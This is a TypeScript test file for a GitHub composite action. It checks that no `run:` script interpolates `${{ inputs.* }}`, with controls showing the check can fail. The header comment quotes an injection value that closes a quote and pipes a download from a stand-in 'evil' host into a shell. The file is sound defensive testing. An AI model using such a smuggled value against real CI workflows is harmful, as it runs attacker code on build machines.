// #4238 (the class #4090 named, after #4221 did url/urls/max-pages): NO INPUT OF THE ACTION REACHES A SCRIPT BY `${{ inputs.* }}`.
//
// GitHub expands `${{ }}` BEFORE the shell sees the text, so an input a pipeline fills from an issue title or a pull-request body
// (`task`, `forms`) becomes shell: a `task` of `"; curl evil | sh; "` closes the quote and runs. Through `env:` the same value is
// data in a variable. `if:`, `with:` and `env:` values stay expressions (they are not shell), so only `run:` text is read.
//
// THE CHECK IS A FUNCTION OF THE FILE'S TEXT, so the controls hand it a mutated copy and a fixture: the function that passes the
// shipped file must refuse the copy with one input put back into a script. A check that cannot be shown to fail is not a check.
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { parse } from "yaml";

const ROOT = resolve(import.meta.dirname ?? new URL(".", import.meta.url).pathname, "../../../..");
const shippedAction = (): string => readFileSync(resolve(ROOT, "action.yml"), "utf8");

interface Step { name?: string; run?: string; env?: Record<string, string> }
const stepsOf = (actionText: string): Step[] => (parse(actionText) as { runs: { steps: Step[] } }).runs.steps;

const INPUT_EXPRESSION = /\$\{\{\s*inputs\./;

/** Every `run:` line that interpolates an input, as `step name: line`. */
function interpolations(actionText: string): string[] {
  return stepsOf(actionText).flatMap((step) => (step.run ?? "").split("\n")
    .filter((line) => INPUT_EXPRESSION.test(line))
    .map((line) => `${step.name ?? "(unnamed)"}: ${line.trim()}`));
}

test("action.yml: no `run:` script interpolates an input with ${{ inputs.* }}", () => {
  assert.deepEqual(interpolations(shippedAction()), []);
});

test("POSITIVE CONTROL: the check reads real `run:` scripts, and inputs do arrive through `env:`", () => {
  const steps = stepsOf(shippedAction());
  const scripts = steps.filter((step) => step.run);
  assert.ok(scripts.length >= 5, `only ${scripts.length} run: steps were read, so an empty result would prove nothing`);
  const viaEnv = steps.flatMap((step) => Object.values(step.env ?? {})).filter((value) => INPUT_EXPRESSION.test(value));
  assert.ok(viaEnv.length >= 10, `only ${viaEnv.length} inputs reach a step through env:, so the remedy is not where it is said to be`);
});

test("CONTROL: one injected ${{ inputs.task }} in a `run:` block is refused", () => {
  const fixture = [
    "runs:",
    "  using: composite",
    "  steps:",
    "    - name: Capture",
    "      shell: bash",
    "      run: |",
    '        [ -n "${{ inputs.task }}" ] && args+=(--task "${{ inputs.task }}")',
  ].join("\n");
  assert.equal(interpolations(fixture).length, 1);
});

test("CONTROL: the shipped action with one input put back into a script is refused, and the same input through env: is not", () => {
  const action = shippedAction();
  const injected = action.replace('args+=(--task "$TASK")', 'args+=(--task "${{ inputs.task }}")');
  assert.notEqual(injected, action, "the mutation changed nothing, so it controls nothing");
  assert.equal(interpolations(injected).length, 1);
  assert.deepEqual(interpolations(action), []);
});
